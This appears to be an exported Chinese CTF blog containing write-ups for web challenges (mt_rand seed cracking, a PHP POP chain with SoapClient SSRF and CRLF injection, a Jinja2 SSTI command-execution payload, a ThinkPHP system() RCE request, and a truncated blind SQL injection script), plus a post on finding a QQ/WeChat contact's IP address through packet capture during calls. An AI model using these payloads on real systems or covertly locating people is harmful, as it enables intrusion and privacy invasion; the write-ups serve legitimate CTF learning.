<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/secrettw.php?2333=php://input&amp;file=ZmpdYSZmXGI=</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 470d4194-20d2-4996-bf51-da5557926abb.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">client-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Length</span>: 20</span><br><span class="line"></span><br><span class="line">todat is a happy day</span><br></pre></td></tr></table></figure>





<h2 id="Not-So-Web-Application"><a href="#Not-So-Web-Application" class="headerlink" title="Not  So Web Application"></a>Not  So Web Application</h2><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p>扫描目录得到源码<a href="http://www.zip,还有一个login.php" target="_blank" rel="noopener">www.zip,还有一个login.php</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);  <span class="comment">//mt_rand(min,max)  返回随机数</span></span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure>

<p>mt_rand种子可以爆破。项目地址<a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener">https://github.com/lepiaf/php_mt_seed</a></p>
<p>按照格式生成</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span></span><br><span class="line">strs=<span class="string">'KVQP0LdJKRaV3n9D'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x in range(len(strs)):</span><br><span class="line">    <span class="keyword">print</span>(strings1.find(strs[x]), end=<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">print</span>(strings1.find(strs[x]),<span class="string">'0'</span> ,end=<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">print</span>(len(strings1)<span class="number">-1</span>, end=<span class="string">' '</span>)</span><br><span class="line"><span class="comment"># 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">% ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br><span class="line">Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62</span><br><span class="line">Found 0, trying 1744830464 - 1778384895, speed 46429762 seeds per second </span><br><span class="line">seed = 1775196155</span><br><span class="line">Found 1, trying 4261412864 - 4294967295, speed 44036507 seeds per second </span><br><span class="line">Found 1</span><br></pre></td></tr></table></figure>

<p>拿到种子，生成私钥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> public_key();  <span class="comment">//KVQP0LdJKRaV3n9D</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> private_key();  <span class="comment">//XuNhoueCDCGceth0</span></span><br></pre></td></tr></table></figure>

<p>在login.html使用万能账号登陆</p>
<p><img src="/pic/146.png" alt=""></p>
<h2 id="Ezpop-Revenge"><a href="#Ezpop-Revenge" class="headerlink" title="Ezpop_Revenge"></a>Ezpop_Revenge</h2><p>扫描目录有源码<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">'flag'</span>]= <span class="string">"MRCTF&#123;******&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"我扌your problem?\nonly localhost can get flag!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现是要ssrf</p>
<p>查看了几个页面后发现Plugin.php中可疑,以下是关键代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Plugin.php</span></span><br><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">"MRCTF&#123;this_is_a_fake_flag&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">'hello'</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">'world'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_Plugin</span> <span class="keyword">implements</span> <span class="title">Typecho_Plugin_Interface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">		 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'admin'</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'C0incid3nc3'</span>])) &#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">"/file|assert|eval|[`\'~^?&lt;&gt;$%]+/i"</span>,base64_decode($_POST[<span class="string">'C0incid3nc3'</span>])) === <span class="number">0</span>)</span><br><span class="line">				unserialize(base64_decode($_POST[<span class="string">'C0incid3nc3'</span>]));</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"Not that easy."</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>HelloWorld_Plugin类中如果传入了admin，就打印出session，是反序列化。HelloWorld_DB类中__wakeup函数创建了一个Typecho_Db类，跟进查看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">        $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);<span class="comment">//__toString()</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化适配器对象</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造函数这里是字符串拼接，还给了提示，__toString()，搜索__toString()，在Query函数中找到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> KEYWORDS = <span class="string">'*PRIMARY|AND|OR|LIKE|BINARY|BY|DISTINCT|AS|IN|IS|NULL'</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $_default = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'action'</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'table'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'fields'</span> =&gt; <span class="string">'*'</span>,</span><br><span class="line">        <span class="string">'join'</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">        <span class="string">'where'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'limit'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'offset'</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'order'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'group'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'having'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'rows'</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">private</span> $_prefix;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'action'</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'INSERT INTO '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">                . <span class="string">' VALUES '</span></span><br><span class="line">                . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'limit'</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'DELETE FROM '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                $columns = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                        $columns[] = <span class="string">"$key = $val"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">'UPDATE '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="string">' SET '</span> . implode(<span class="string">' , '</span>, $columns)</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找到这里就发现select处可以构造soapclient，进行ssrf。</p>
<p>整理一下pop链</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">HelloWorld_DB::__wakeup()-&gt;Typecho_Db::__construct()-&gt;Typecho_Db_Query::__toString()-&gt;SoapClient::-&gt;__call()</span><br></pre></td></tr></table></figure>

<p>有了pop链了，开始写脚本，在写脚本的过程中发现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>soap类无法传入session，但是使用CRLF注入</p>
<blockquote>
<p>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>
<p>[参考链接](<a href="https://wooyun.js.org/drops/CRLF" target="_blank" rel="noopener">https://wooyun.js.org/drops/CRLF</a> Injection漏洞的利用与实例分析.html)</p>
</blockquote>
<p>在user-agengt处使用\r\n进行换行</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctf</tag>
        <tag>待完成</tag>
      </tags>
  </entry>
  <entry>
    <title>获取好友IP</title>
    <url>/2020/03/24/%E8%8E%B7%E5%8F%96%E5%A5%BD%E5%8F%8BIP/</url>
    <content><![CDATA[<h2 id="安装了火绒的方式"><a href="#安装了火绒的方式" class="headerlink" title="安装了火绒的方式"></a>安装了火绒的方式</h2><p>打开火绒剑点击Processes，找到QQ/微信的PID</p>
<ol>
<li><p>点击Fileter</p>
</li>
<li><p>下拉选择Process Filter</p>
</li>
</ol>
<a id="more"></a>

<ol start="3">
<li><p>选择Process</p>
</li>
<li><p>点击add </p>
</li>
<li><p>选择PID</p>
</li>
<li><p>Value填QQ/微信的PID</p>
</li>
<li><p>切换到Action</p>
</li>
<li><p>只选中MT_netmon</p>
</li>
<li><p>点击OK</p>
</li>
</ol>
<p><img src="/pic/136.png" alt=""></p>
<p><img src="/pic/137.png" alt=""></p>
<p>然后点击Start，此处已经点击了Start，所以变成Stop</p>
<p><img src="/pic/138.png" alt=""></p>
<p>在Path处非8000端口即可能得到好友IP，此处因为本菜鸡多次测试（猜测，也能是网络不好），被腾讯强制连接到了腾讯的服务器</p>
<h2 id="未安装火绒的方式"><a href="#未安装火绒的方式" class="headerlink" title="未安装火绒的方式"></a>未安装火绒的方式</h2><p>打开wireshark 选择上网网卡，双击</p>
<p><del><img src="/pic/133.png" alt=""></del></p>
<p><del>点击搜索按钮（快捷键Ctrl+F），选择Packet details（中文：分组详情）,Sting(中文：字符串)</del></p>
<p><del>填入数据020048</del></p>
<p><del><img src="/pic/134.png" alt=""></del></p>
<p>在搜索栏里输入udp.lenth==80（经过测试，拨打后未接通发送的数据包的大小是72，因为还有包头所以+8）</p>
<p>然后就可以拨打好友的电话</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>多次挂断电话，再接通，会直接接入到腾讯服务器，从而后面就获取不到对方IP（此时电话以及接通）如下图</p>
<p><img src="/pic/135.png" alt=""></p>
<p>对方QQ版本为QQ FOR win10(Microsoft  store中下载)，本菜鸡测试 ：未接通没有数据</p>
<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>腾讯连接的方式是如果检测到处于同一内网，QQ/TIM会直接点对点，这也就解释了为什么学校晚上断网后还能互发QQ消息。</p>
<p><strong>参考链接</strong></p>
<p><a href="https://www.secpulse.com/archives/126081.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/126081.html</a><br><a href="https://www.cnblogs.com/Oran9e/p/7098097.html" target="_blank" rel="noopener">https://www.cnblogs.com/Oran9e/p/7098097.html</a></p>
]]></content>
      <categories>
        <category>日常水文</category>
      </categories>
      <tags>
        <tag>无聊</tag>
        <tag>水文</tag>
      </tags>
  </entry>
  <entry>
    <title>第二届BJDCTFwp-web</title>
    <url>/2020/03/21/%E7%AC%AC%E4%BA%8C%E5%B1%8ABJDCTFwp-web/</url>
    <content><![CDATA[<h2 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h2><p>打开后是一个谷歌的界面，随意输入数据后查看源码，提示SSTI</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--ssssssti &amp; a little trick --&gt;</span> P3's girlfirend is : 1<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试过滤，非数字时{被过滤，使用url编码绕过即可</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">paylaod:</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">%7b%25%20%66%6f%72%20%63%20%69%6e%20%5b%5d%2e%5f%5f%63%6c%61%73%73%5f%5f%2e%5f%5f%62%61%73%65%5f%5f%2e%5f%5f%73%75%62%63%6c%61%73%73%65%73%5f%5f%28%29%20%25%7d%7b%25%20%69%66%20%63%2e%5f%5f%6e%61%6d%65%5f%5f%3d%3d%27%63%61%74%63%68%5f%77%61%72%6e%69%6e%67%73%27%20%25%7d%7b%7b%20%63%2e%5f%5f%69%6e%69%74%5f%5f%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%5b%27%5f%5f%62%75%69%6c%74%69%6e%73%5f%5f%27%5d%2e%65%76%61%6c%28%22%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%6f%73%27%29%2e%70%6f%70%65%6e%28%27%63%61%74%20%2f%66%6c%61%67%27%29%2e%72%65%61%64%28%29%22%29%20%7d%7d%7b%25%20%65%6e%64%69%66%20%25%7d%7b%25%20%65%6e%64%66%6f%72%20%25%7d</span><br></pre></td></tr></table></figure>

<h2 id="old-hack-1"><a href="#old-hack-1" class="headerlink" title="old-hack"></a>old-hack</h2><p>打开页面就提示powered by thinkphp</p>
<p>搜索漏洞</p>
<p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p>
<p>直接利用</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?s=captcha</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 733fb3d8-d4b8-451e-91bf-78b47cf3db15.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 89</span><br><span class="line"><span class="attribute">Origin</span>: http://733fb3d8-d4b8-451e-91bf-78b47cf3db15.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://733fb3d8-d4b8-451e-91bf-78b47cf3db15.node3.buuoj.cn/?s=captcha</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter%5B%5D=system&amp;method=get&amp;server%5BREQUEST_METHOD%5D=cat+%2Fflag</span><br></pre></td></tr></table></figure>



<h2 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h2><p>测试发现过滤的单引号，select，但是有两个输入处，测试是盲注，可以转义一个单引号，然后注释一个单引号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：</span><br><span class="line">username&#x3D;admin\&amp;password&#x3D;or 0#</span><br></pre></td></tr></table></figure>

<p>编写脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(strs)</span>:</span></span><br><span class="line">    hexs=<span class="string">'0x'</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(strs)):</span><br><span class="line">        hexs+=hex(ord(strs[x]))[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># print(hexs)</span></span><br><span class="line">    <span class="keyword">return</span> hexs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url=<span class="string">'http://d13d29d3-e336-4af5-adc9-6f48b9878152.node3.buuoj.cn'</span></span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line"></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'1\\'</span>,</span><br><span class="line">        <span class="string">'password'</span>: <span class="string">'or '</span>+payload+<span class="string">'#'</span></span><br><span class="line">    &#125;</span><br><span class="line">    html = requests.post(url,data=data)</span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    <span class="comment"># print(html.text)</span></span><br><span 